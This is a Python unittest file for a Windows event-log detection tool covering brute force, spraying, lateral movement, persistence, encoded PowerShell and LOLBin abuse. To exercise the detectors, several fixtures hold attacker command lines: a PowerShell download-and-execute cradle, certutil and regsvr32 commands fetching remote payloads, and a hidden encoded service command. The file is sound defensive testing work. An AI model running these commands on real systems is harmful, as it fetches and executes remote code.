import base64
import unittest

from helpers import ev, sysmon

from winlog_hunter.rules import Config, decode_powershell, run_rules

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"


def ids(events, config=None):
    return [f.rule_id for f in run_rules(events, config)]


def fails(n, user="admin", ip="203.0.113.5", step=10, start=0, logon_type="10"):
    return [ev(4625, start + i * step, TargetUserName=user, IpAddress=ip, LogonType=logon_type,
               SubStatus="0xC000006A") for i in range(n)]


class AuthenticationRules(unittest.TestCase):
    def test_brute_force_needs_threshold_inside_window(self):
        self.assertIn("WLH-001", ids(fails(5)))
        self.assertNotIn("WLH-001", ids(fails(4)))
        self.assertNotIn("WLH-001", ids(fails(5, step=120)))  # 5 fallos en 8 min > ventana de 5

    def test_brute_force_is_one_finding_per_burst(self):
        findings = [f for f in run_rules(fails(40, step=5)) if f.rule_id == "WLH-001"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].event_count, 40)
        self.assertEqual(findings[0].evidence["motivos"], {"contraseña incorrecta": 40})

    def test_custom_threshold(self):
        self.assertIn("WLH-001", ids(fails(3), Config(brute_force_threshold=3)))

    def test_password_spray(self):
        events = [ev(4625, i * 5, TargetUserName=f"user{i}", IpAddress="198.51.100.9") for i in range(6)]
        self.assertEqual(ids(events), ["WLH-002"])
        self.assertNotIn("WLH-002", ids(events[:4]))

    def test_success_after_failures_is_critical(self):
        events = fails(6) + [ev(4624, 70, TargetUserName="admin", IpAddress="203.0.113.5", LogonType="10")]
        findings = {f.rule_id: f for f in run_rules(events)}
        self.assertEqual(findings["WLH-003"].severity, "critical")
        self.assertEqual(findings["WLH-003"].evidence["intentos_fallidos_previos"], 6)

    def test_success_from_other_ip_is_not_flagged(self):
        events = fails(6) + [ev(4624, 70, TargetUserName="admin", IpAddress="10.0.0.8", LogonType="10")]
        self.assertNotIn("WLH-003", ids(events))

    def test_same_local_user_on_other_host_is_not_correlated(self):
        # 'admin' local de HOST-A atacado; 'admin' local de HOST-B entra sin problemas.
        events = fails(6) + [ev(4624, 70, computer="HOST-B", TargetUserName="admin",
                                IpAddress="203.0.113.5", LogonType="10")]
        self.assertNotIn("WLH-003", ids(events))

    def test_same_user_in_other_domain_is_not_correlated(self):
        events = [ev(4625, i * 10, TargetUserName="admin", TargetDomainName="CORP", IpAddress="203.0.113.5")
                  for i in range(6)]
        events.append(ev(4624, 70, TargetUserName="admin", TargetDomainName="LAB", IpAddress="203.0.113.5"))
        self.assertNotIn("WLH-003", ids(events))

    def test_lateral_movement(self):
        events = [ev(4624, i * 60, computer=host, TargetUserName="mlopez", IpAddress="10.0.0.21", LogonType="3")
                  for i, host in enumerate(["SRV1", "SRV2", "SRV3"])]
        self.assertEqual(ids(events), ["WLH-004"])

    def test_lateral_movement_ignores_machine_accounts_and_local(self):
        machine = [ev(4624, i, computer=h, TargetUserName="WS01$", IpAddress="10.0.0.21", LogonType="3")
                   for i, h in enumerate(["A", "B", "C"])]
        local = [ev(4624, i, computer=h, TargetUserName="bob", IpAddress="127.0.0.1", LogonType="3")
                 for i, h in enumerate(["A", "B", "C"])]
        self.assertEqual(ids(machine + local), [])


class PersistenceRules(unittest.TestCase):
    def test_log_cleared(self):
        self.assertEqual(ids([ev(1102, SubjectUserName="x")]), ["WLH-005"])
        self.assertEqual(ids([ev(104, channel="System", Channel="Application")]), ["WLH-005"])
        self.assertEqual(ids([ev(104, channel="Application")]), [])

    def test_service_severity(self):
        benign = ev(7045, channel="System", ServiceName="Spooler2", ImagePath=r"C:\Program Files\App\svc.exe")
        psexec = ev(7045, channel="System", ServiceName="PSEXESVC", ImagePath=r"%SystemRoot%\PSEXESVC.exe")
        evil = ev(7045, channel="System", ServiceName="upd", ImagePath="cmd.exe /c powershell -enc AAAA")
        severities = {f.evidence["servicio"]: f.severity for f in run_rules([benign, psexec, evil])}
        self.assertEqual(severities, {"Spooler2": "low", "PSEXESVC": "high", "upd": "high"})

    def test_scheduled_task_reads_command(self):
        content = "&lt;Task&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;Arguments&gt;-w hidden&lt;/Arguments&gt;"
        finding = run_rules([ev(4698, TaskName="\\x", TaskContent=content)])[0]
        self.assertEqual(finding.severity, "high")
        self.assertEqual(finding.evidence["accion"], "powershell.exe -w hidden")

    def test_privileged_group_by_sid_any_language(self):
        local_admins = ev(4732, TargetUserName="Administratoren", TargetSid="S-1-5-32-544", MemberSid="S-1-5-21-1-2-3-1001")
        domain_admins = ev(4728, TargetUserName="Domänen-Admins", TargetSid="S-1-5-21-1-2-3-512", MemberName="CN=x")
        normal = ev(4732, TargetUserName="Contabilidad", TargetSid="S-1-5-21-1-2-3-1200", MemberSid="S-1-5-21-1-2-3-1001")
        severities = [f.severity for f in run_rules([local_admins, domain_admins, normal])]
        self.assertEqual(severities, ["critical", "high"])


class ExecutionRules(unittest.TestCase):
    def test_decode_powershell(self):
        payload = base64.b64encode("Write-Host hola".encode("utf-16-le")).decode()
        self.assertEqual(decode_powershell(f"powershell -ep bypass -EncodedCommand {payload}"), "Write-Host hola")
        self.assertEqual(decode_powershell(f"powershell -e {payload}"), "Write-Host hola")
        self.assertEqual(decode_powershell("powershell -ExecutionPolicy Bypass -File a.ps1"), "")

    def test_encoded_powershell_is_high(self):
        payload = base64.b64encode("IEX (iwr http://x/a.ps1)".encode("utf-16-le")).decode()
        finding = run_rules([sysmon(0, PS, f"powershell.exe -nop -w hidden -enc {payload}")])[0]
        self.assertEqual((finding.rule_id, finding.severity), ("WLH-010", "high"))
        self.assertIn("descarga remota", finding.evidence["indicadores"])

    def test_admin_powershell_is_not_flagged(self):
        self.assertEqual(ids([sysmon(0, PS, "powershell.exe -NoProfile -Command Get-Service")]), [])

    def test_weak_indicators_are_medium(self):
        finding = run_rules([sysmon(0, PS, "powershell.exe -NoProfile -WindowStyle Hidden -File c:\\x.ps1")])[0]
        self.assertEqual(finding.severity, "medium")

    def test_lolbins(self):
        events = [
            sysmon(0, r"C:\Windows\System32\certutil.exe", "certutil -urlcache -split -f http://x/a.exe a.exe"),
            sysmon(1, r"C:\Windows\System32\regsvr32.exe", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"),
            sysmon(2, r"C:\Windows\System32\certutil.exe", "certutil -hashfile a.exe SHA256"),
        ]
        findings = run_rules(events)
        self.assertEqual([f.mitre for f in findings], [["T1105", "T1140"], ["T1218.010"]])

    def test_office_spawning_shell_and_4688(self):
        sysmon_event = sysmon(0, r"C:\Windows\System32\cmd.exe", "cmd /c whoami", parent=WORD)
        security_event = ev(4688, 1, NewProcessName=r"C:\Windows\System32\wscript.exe",
                            ParentProcessName=r"C:\Program Files\Office\EXCEL.EXE", CommandLine="wscript a.js")
        self.assertEqual(ids([sysmon_event, security_event]), ["WLH-012", "WLH-012"])


if __name__ == "__main__":
    unittest.main()
